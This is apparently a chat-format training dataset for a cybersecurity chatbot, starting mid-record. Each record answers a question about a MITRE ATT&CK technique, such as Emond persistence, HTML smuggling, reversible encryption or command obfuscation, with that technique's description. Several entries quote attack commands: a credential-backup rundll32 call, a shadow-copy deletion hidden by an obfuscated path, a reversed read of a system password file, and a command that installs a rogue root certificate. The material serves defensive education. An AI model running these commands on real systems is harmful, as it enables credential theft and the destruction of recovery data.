files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Emond' and with the Id: T1519 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Emond' and with the Id: T1519 is described as follows: Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1160) service.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing via Service' and with the Id: T1194 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing via Service' and with the Id: T1194 is described as follows: Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hardware Additions' and with the Id: T1200 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hardware Additions' and with the Id: T1200 is described as follows: Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Server Software Component' and with the Id: T1505 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Server Software Component' and with the Id: T1505 is described as follows: Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW). The systems targeted by this attack pattern are: Windows, Linux, macOS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Destruction' and with the Id: T1485 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Destruction' and with the Id: T1485 is described as follows: Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Non-Standard Encoding' and with the Id: T1132.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Non-Standard Encoding' and with the Id: T1132.002 is described as follows: Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Controller Authentication' and with the Id: T1556.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Controller Authentication' and with the Id: T1556.001 is described as follows: Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Transfer Data to Cloud Account' and with the Id: T1537 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Transfer Data to Cloud Account' and with the Id: T1537 is described as follows: Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.(Citation: TLDRSec AWS Attacks)Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature)Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) . The systems targeted by this attack pattern are: IaaS, SaaS, Google Workspace, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'HTML Smuggling' and with the Id: T1027.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'HTML Smuggling' and with the Id: T1027.006 is described as follows: Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Reversible Encryption' and with the Id: T1556.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Reversible Encryption' and with the Id: T1556.005 is described as follows: An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Command Obfuscation' and with the Id: T1027.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Command Obfuscation' and with the Id: T1027.010 is described as follows: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)Tools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Install Root Certificate' and with the Id: T1130 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Install Root Certificate' and with the Id: T1130 is described as follows: Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Encrypted' and with the Id: T1022 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Encrypted' and with the Id: T1022 is described as follows: Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.Other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File Deletion' and with the Id: T1070.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File Deletion' and with the Id: T1070.004 is described as follows: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Drive-by Compromise' and with the Id: T1189 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Drive-by Compromise' and with the Id: T1189 is described as follows: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)Typical drive-by compromise process:1. A user visits a website that is used to host the adversary controlled content.2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.     * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.3. Upon finding a vulnerable version, exploit code is delivered to the browser.4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017). The systems targeted by this attack pattern are: Windows, Linux, macOS, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Denial of Service' and with the Id: T1498 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Denial of Service' and with the Id: T1498 is described as follows: Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Administration Command' and with the Id: T1651 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Administration Command' and with the Id: T1651 is described as follows: Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Installer Packages' and with the Id: T1546.016 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Installer Packages' and with the Id: T1546.016 is described as follows: Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scanning IP Blocks' and with the Id: T1595.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scanning IP Blocks' and with the Id: T1595.001 is described as follows: Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hidden Files and Directories' and with the Id: T1158 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hidden Files and Directories' and with the Id: T1158 is described as follows: To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.### WindowsUsers can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the \u201c+s\u201d marks a file as a system file and the \u201c+r\u201d flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively \u201c/S\u201d.### Linux/MacUsers can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.### MacFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Template Injection' and with the Id: T1221 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Template Injection' and with the Id: T1221 is described as follows: Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)Adversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016). The systems targeted by this attack pattern are: Windows ."}]}
